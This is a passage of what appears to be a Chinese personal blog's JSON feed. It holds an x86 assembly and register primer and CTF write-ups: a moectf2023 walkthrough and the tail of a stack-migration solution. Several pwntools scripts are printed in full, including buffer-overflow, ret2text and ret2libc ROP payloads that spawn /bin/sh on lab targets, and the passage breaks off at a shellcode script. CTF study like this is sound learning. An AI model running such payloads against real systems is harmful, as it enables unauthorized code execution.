data-num=\"20\"></td><td><pre>rsi_r15_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x400731</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x04004d1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>src <span class=\"token operator\">=</span> <span class=\"token number\">0x400770</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'What\\'s your name? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rsi_r15_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>printf_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'!\\nWelcome to the Pwn World again, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'!\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span>2c<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>exit_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "stack migration"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/08/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
            "url": "http://waltcsz.github.io/2023/08/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
            "title": "汇编基础知识",
            "date_published": "2023-08-20T09:58:02.000Z",
            "content_html": "<h1 id=\"汇编\"><a class=\"markdownIt-Anchor\" href=\"#汇编\">#</a> 汇编</h1>\n<h2 id=\"汇编指令\"><a class=\"markdownIt-Anchor\" href=\"#汇编指令\">#</a> 汇编指令</h2>\n<p>在 Linux 上，大部分双操作数的指令均已前者为目的操作数，后者为源操作数。</p>\n<h3 id=\"间接寻址\"><a class=\"markdownIt-Anchor\" href=\"#间接寻址\">#</a> 间接寻址</h3>\n<p>**[] ** 表示间接寻址，类似 c 语言的 ***** .</p>\n<pre><code class=\"language-assembly\">mov eax, [ebx+8]\t;若ebx储存值为0x4008，则该指令将0x4010处的值赋给eax\nmov eax, [0x4001]\t;将地址0x4001处的值赋给eax(该代码为推测，不一定合法)\nlea eax, [ebx]\t;直接将ebx的值赋值给eax\n</code></pre>\n<h3 id=\"常用命令\"><a class=\"markdownIt-Anchor\" href=\"#常用命令\">#</a> 常用命令</h3>\n<p>push 将数据入栈，pop 将栈顶数据弹出</p>\n<pre><code class=\"language-assembly\">push eip\t；将eip储存的值入栈\npop eip\t\t;将栈顶数据弹出并存入eip\n</code></pre>\n<p>mov 传送字节，相当于赋值语句。</p>\n<p>lea 装入有效地址，相当于取地址。</p>\n<pre><code class=\"language-assembly\">mov eax, ebx\t;将ebx的值赋给eax\nmov ecx, 0Ah\t;将ecx赋值为0x0A\n\nlea eax, [ebp+buf]\t;将局部变量buf的地址存入eax\n\n</code></pre>\n<p>call 调用函数。jmp 跳转指令。</p>\n<pre><code class=\"language-assembly\">call __printf\t;跳转printf函数\n\t\t\t\t;call相当于入栈当前eip后执行jmp\npush eip\njmp __printf\n</code></pre>\n<p>inc 将目标操作数自增 1</p>\n<p>dec 将目标操作数自减 1</p>\n<h3 id=\"比较和跳转\"><a class=\"markdownIt-Anchor\" href=\"#比较和跳转\">#</a> 比较和跳转</h3>\n<h2 id=\"寄存器\"><a class=\"markdownIt-Anchor\" href=\"#寄存器\">#</a> 寄存器</h2>\n<h3 id=\"通用寄存器\"><a class=\"markdownIt-Anchor\" href=\"#通用寄存器\">#</a> 通用寄存器</h3>\n<h4 id=\"指针寄存器\"><a class=\"markdownIt-Anchor\" href=\"#指针寄存器\">#</a> 指针寄存器</h4>\n<table>\n<thead>\n<tr>\n<th>32 位</th>\n<th>64 位</th>\n<th>名称</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EBP</td>\n<td>RBP</td>\n<td>基址指针寄存器 (extended base pointer)</td>\n<td>指向栈帧的底部</td>\n</tr>\n<tr>\n<td>ESP</td>\n<td>RSP</td>\n<td>栈指针寄存器 (extended stack pointer)</td>\n<td>指向栈帧的顶部</td>\n</tr>\n<tr>\n<td>ESI</td>\n<td>RSI</td>\n<td>源变址寄存器 (Source Index)</td>\n<td>字符串操作源指针</td>\n</tr>\n<tr>\n<td>EDI</td>\n<td>RDI</td>\n<td>目的指针寄存器 (Destination Index)</td>\n<td>字符串操作目标指针</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"数据寄存器\"><a class=\"markdownIt-Anchor\" href=\"#数据寄存器\">#</a> 数据寄存器</h4>\n<p>数据寄存器主要用来保存操作数和运算结果等信息。</p>\n<p>在 64 位系统下，32 位寄存器代表对应 64 位寄存器的低 32 位。例如 eax 为 rax 的低 32 位。修改 eax 不影响 rax 高位部分。16 位寄存器同理。</p>\n<p>此外，16 位寄存器可分为 2 个 8 位寄存器。(AX: ah~al; BX: bh~bl; CX: ch~cl; DX: dh~dl) 分别表示高 8 位和低 8 位。</p>\n<table>\n<thead>\n<tr>\n<th>32 位</th>\n<th>64 位</th>\n<th>16 位</th>\n<th>名称</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EAX</td>\n<td>RAX</td>\n<td>AX</td>\n<td>累加寄存器 (Accumulator)</td>\n<td>在乘法和除法指令中被自动使用；在 Win32 中，一般用在函数的返回值中。</td>\n</tr>\n<tr>\n<td>EBX</td>\n<td>RBX</td>\n<td>BX</td>\n<td>基址寄存器 (Base)</td>\n<td>DS 段中的数据指针</td>\n</tr>\n<tr>\n<td>ECX</td>\n<td>RCX</td>\n<td>CX</td>\n<td>计数寄存器 (Count)</td>\n<td>CPU 自动使用 ECX 作为循环计数器，在字符串和循环操作中常用，在循环指令（LOOP）或串操作中，ECX 用来进行循环计数，每执行一次循环，ECX 都会被 CPU 自动减一</td>\n</tr>\n<tr>\n<td>EDX</td>\n<td>RDX</td>\n<td>DX</td>\n<td>数据寄存器 (Data)</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<img data-src=\"./Center.png\" alt=\"寄存器\" style=\"zoom:33%;\" />\n<h3 id=\"指令寄存器\"><a class=\"markdownIt-Anchor\" href=\"#指令寄存器\">#</a> 指令寄存器</h3>\n<table>\n<thead>\n<tr>\n<th>32 位</th>\n<th>64 位</th>\n<th>名称</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EIP</td>\n<td>RIP</td>\n<td>指令指针寄存器 (Instruction Pointer)</td>\n<td>保存着下一条要执行的指令的地址。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"段寄存器\"><a class=\"markdownIt-Anchor\" href=\"#段寄存器\">#</a> 段寄存器</h3>\n<table>\n<thead>\n<tr>\n<th>寄存器</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CS</td>\n<td>代码段 (Code Segment)</td>\n</tr>\n<tr>\n<td>DS</td>\n<td>数据段 (Data Segment)</td>\n</tr>\n<tr>\n<td>SS</td>\n<td>堆栈段 (Stack Segment)</td>\n</tr>\n<tr>\n<td>ES</td>\n<td>附加数据段 (Extra Segment)</td>\n</tr>\n<tr>\n<td>FS</td>\n<td>附加数据段</td>\n</tr>\n<tr>\n<td>GS</td>\n<td>附加数据段</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h3>\n<h4 id=\"条件标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#条件标志寄存器\">#</a> 条件标志寄存器</h4>\n<table>\n<thead>\n<tr>\n<th>寄存器</th>\n<th>解释</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OF</td>\n<td>溢出标志位 (OverFlow Flag)</td>\n<td>用来反应有符号数加减法运算所得结果是否溢出。运算超出当前运算位数所能表示的范围，则称为溢出，标志位被置为 1，否则为 0。</td>\n</tr>\n<tr>\n<td>SF</td>\n<td>符号标志位 (Sign Flag)</td>\n<td>用来反应运算结果是否为 0。运算结果为负时置为 1，否则为 0。</td>\n</tr>\n<tr>\n<td>ZF</td>\n<td>零标志位 (Zero Flag)</td>\n<td>用来反应运算结果是否为 0。为零时置为 1，否则为 0。</td>\n</tr>\n<tr>\n<td>AF</td>\n<td>辅助进位标志位 (Auxilliary carry Flag)</td>\n<td>在字操作址，发生低字节向高字节进位或借位时该标志位被置为 1，否则为 0。</td>\n</tr>\n<tr>\n<td>PF</td>\n<td>奇偶标志位 (Parity Flag)</td>\n<td>用于反应结果中 “1” 的个数的奇偶性。如果 “1” 为偶数置为 1，否则为 0。</td>\n</tr>\n<tr>\n<td>CF</td>\n<td>进位标志位 (Carry Flag)</td>\n<td>运算结果的最高位产生了一个进位或错位，则该标志位置为 1，否则为 0。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"控制控制寄存器\"><a class=\"markdownIt-Anchor\" href=\"#控制控制寄存器\">#</a> 控制控制寄存器</h4>\n<table>\n<thead>\n<tr>\n<th>寄存器</th>\n<th>解释</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DF</td>\n<td>方向标志位 (Direction Flag)</td>\n<td>用于串操作指令中，控制地址的变化方向。当 DF 为 0 时，存储器地址自动增加；当 DF 为 1 时，存储器地址自动减少。</td>\n</tr>\n<tr>\n<td>IF</td>\n<td>中断标志位 (Interrupt Flag)</td>\n<td>用于控制外部可屏蔽中断是否可以被处理器响应。[^1]</td>\n</tr>\n<tr>\n<td>TF</td>\n<td>陷阱标志位 (Trap Flag)</td>\n<td>用于控制处理器是否进入单步操作方式。当 TF 为 0 时，处理器在正常模式下运行；当为 1 时，处理器单步执行指令，调试器可以逐步指令进行执行就是使用了该标志位。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"特殊64位调用函数传参\"><a class=\"markdownIt-Anchor\" href=\"#特殊64位调用函数传参\">#</a> 特殊：64 位调用函数传参</h3>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>寄存器</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>1</strong></td>\n<td><strong>rdi</strong></td>\n</tr>\n<tr>\n<td><strong>2</strong></td>\n<td><strong>rsi</strong></td>\n</tr>\n<tr>\n<td>3</td>\n<td>rdx</td>\n</tr>\n<tr>\n<td>4</td>\n<td>rcx</td>\n</tr>\n<tr>\n<td>5</td>\n<td>r8</td>\n</tr>\n<tr>\n<td>6</td>\n<td>r9</td>\n</tr>\n<tr>\n<td>7+</td>\n<td>从右向左压入栈中</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "汇编",
                "寄存器"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/08/moectf2023/",
            "url": "http://waltcsz.github.io/2023/08/moectf2023/",
            "title": "moectf2023",
            "date_published": "2023-08-12T10:03:43.000Z",
            "content_html": "<h1 id=\"moectf\"><a class=\"markdownIt-Anchor\" href=\"#moectf\">#</a> Moectf</h1>\n<h2 id=\"test_nc\"><a class=\"markdownIt-Anchor\" href=\"#test_nc\">#</a> test_nc</h2>\n<p>了解了 nc 指令，在不使用 pwntools 的 remote 命令连接靶机时可以用。直接连接靶机更方便。</p>\n<p><img data-src=\"./image-20230820205449199.png\" alt=\"image-20230820205449199\"></p>\n<h2 id=\"baby_calculater\"><a class=\"markdownIt-Anchor\" href=\"#baby_calculater\">#</a> baby_calculater</h2>\n<p>完成 100 次算式校验就行，顺便学了一下 python 的正则匹配来简化代码。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'34599'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'start!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token builtin\">str</span><span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    lst <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\d+'</span><span class=\"token punctuation\">,</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\d+[+]\\d+[=]\\d+'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>lst<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>lst<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>lst<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'BlackBird'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'WingS'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#    sleep(0.5)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230820205900910.png\" alt=\"image-20230820205900910\"></p>\n<h2 id=\"fd\"><a class=\"markdownIt-Anchor\" href=\"#fd\">#</a> fd</h2>\n<p>题目提到 fd（file descriptor) 以及源码中有 dup2 函数，是新知识，便查了一下。</p>\n<p><img data-src=\"./image-20230820210247331.png\" alt=\"image-20230820210247331\"></p>\n<p>打开文件会创建一个文件描述符 fd，指向该文件（可以多个 fd 指向同一文件）。dup2 的用途就是将作为第二个参数的 fd 重定向为第一个参数所指文件。</p>\n<p>dup (oldfd) 则是创建一个新的 fd 指向原 fd 所指文件。</p>\n<p>fd 本质是从 0 到 OPEN_MAX-1 的整数。0 为标准输入，1 为标准输出，2 为错误输出。创立新 fd 时，会在 files_struct 数组当中，找到当前没有被使用的最小的一个下标，作为新的文件描述符。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RoZVdpbmRSaXNlc2xsL2FydGljbGUvZGV0YWlscy84NjQ4NDU1MA==\">文件描述符分配</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjQ2MTczMjk=\">文件描述符由来</span></p>\n<p>该程序打开 flag 文件所分配的 fd 应为 3。那么该程序中 new_fd 的值应该为 3&lt;&lt;4 | 0x29A，即为 670.</p>\n<p><img data-src=\"./image-20230820211002759.png\" alt=\"image-20230820211002759\"></p>\n<p>后面程序中将获取的输入作为 fd 进行读取，因此输入 670 即可获得 flag。</p>\n<p><img data-src=\"./image-20230820211140349.png\" alt=\"image-20230820211140349\"></p>\n<h2 id=\"int_overflow\"><a class=\"markdownIt-Anchor\" href=\"#int_overflow\">#</a> int_overflow</h2>\n<p>不允许输入符号，输入值为 - 114514 得 flag，在 64 位整数下输入 - 114514 然后将高位全部清 0 即可</p>\n<p><img data-src=\"./image-20230820211656633.png\" alt=\"image-20230820211656633\"></p>\n<h2 id=\"ret2text_32\"><a class=\"markdownIt-Anchor\" href=\"#ret2text_32\">#</a> ret2text_32</h2>\n<p>基础</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn1')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">38079</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x58</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">92</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x0804C02C</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x080492a9</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>vln <span class=\"token operator\">=</span> <span class=\"token number\">0x08049213</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'age?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'200'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'flow!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>vln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2text_64\"><a class=\"markdownIt-Anchor\" href=\"#ret2text_64\">#</a> ret2text_64</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p = process ('./1')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote <span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">35035</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x04011be</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x04012b7</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x0404050</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64 <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'age?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'200'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil <span class=\"token punctuation\">(</span><span class=\"token string\">b'flow!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"shellcode_level0\"><a class=\"markdownIt-Anchor\" href=\"#shellcode_level0\">#</a> shellcode_level0</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td 